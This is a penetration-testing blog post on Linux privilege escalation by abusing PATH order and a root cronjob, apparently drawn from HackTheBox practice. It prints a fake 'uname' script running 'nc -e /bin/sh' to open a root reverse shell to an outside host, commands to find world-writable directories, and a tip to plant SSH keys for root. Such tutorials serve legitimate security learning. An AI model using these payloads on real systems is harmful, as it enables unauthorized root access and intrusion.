---
layout: post
title:  "$PATH and Linux privilege escalation"
description: "A note concerning privilege escalation in Linux by abusing path priorities."
tag: [linux, privesc]
---

# Path priority is important

A short note on why write permission could be a recipe for disaster.

Privilege escalation is the process of elevating privileges on a computer system in an unauthorized way. For instance, we could have a legitimate user account and attempt to exploit a misconfiguration or even a vulnerable kernel (see [DirtyCow exploit](https://www.exploit-db.com/exploits/40616)). In penetration testing, there is often a situation in which we gain access to a system shell, but the shell is limited to user with low-privileges. Let's say we have sucessfully exploited a command injection vulnerability on a web server, have a reverse shell, but the shell belongs to the *www-data* user. Our goal is to escalate from here to root. This post is about a particular method abusing a misconfiguration and the PATH env variable mechanism and a legitimate cronjob running as root.

When Linux is looking for a path to execute binary called like:

```console
marek@marek-mint:~$ python
Python 2.7.15+ (default, Nov 27 2018, 23:36:35) 
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```
It will check paths in order defined in PATH environmental variable, like this:

```console
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

So from left to right:

```console
marek@marek-mint:~$ file /usr/local/bin/python
/usr/local/bin/python: cannot open `/usr/local/bin/python' (No such file or directory)
marek@marek-mint:~$ file /usr/sbin/python
/usr/sbin/python: cannot open `/usr/sbin/python' (No such file or directory)
marek@marek-mint:~$ file /usr/bin/python
/usr/bin/python: symbolic link to python2.7
```
Found a symlink, executes, the actual binary is:

```console
marek@marek-mint:~$ readlink -f /usr/bin/python
/usr/bin/python2.7
```

Apparently there.

# Privilege escalation

This method may be used to escalate privileges if our user has write permission to a directory another user or even root executed binaries from. So if let's say root executes a perl script and we can't tamper with the script maybe we can tamper with the interpreter binary itself. If it's possible to replace the binary with eg. a bash script with commands to execute, they will execute as root and escalate privileges this way.

There may be a situation we don't even have to overwrite the binary, because if we put a malicious script named "perl" in a location that takes precedence in the PATH eg. */usr/local/sbin/perl* then it will be executed instead. Always look for writable locations during privilege escalation attempts.

Finding writable locations:
```console
find / -writable -type d 2>/dev/null      # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o w -type d 2>/dev/null     # world-writeable folders
```
Source: [g0tm1k](http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)

So there was a script running as root with cron calling "uname". Notice that "uname" is just a built-in system program so the administrator trusted it to be harmless. I created an executable script:

```console
user@remotemachine:~$ cat uname
#!/bin/sh

nc -e '/bin/sh' 10.0.0.3 9001
```
which would create a reverse shell as root to my local machine 10.0.0.3 listening on port 9001. 

```console
root@kali:~# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.0.0.3] from (UNKNOWN) [10.0.0.4] 38682
whoami
root
```

Most of the time it's a good idea to upgrade shell like this:
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```
Of course nc might have not been installed on the remote box but any available command may be called as root this way. You may for example push your public key to authorized_keys of another user or root and login with SSH.

I've learned this during my [HackTheBox](https://hackthebox.eu) hacking attempts, a platform which I recommend as it has a great number of machines and challenges and a supportive community.
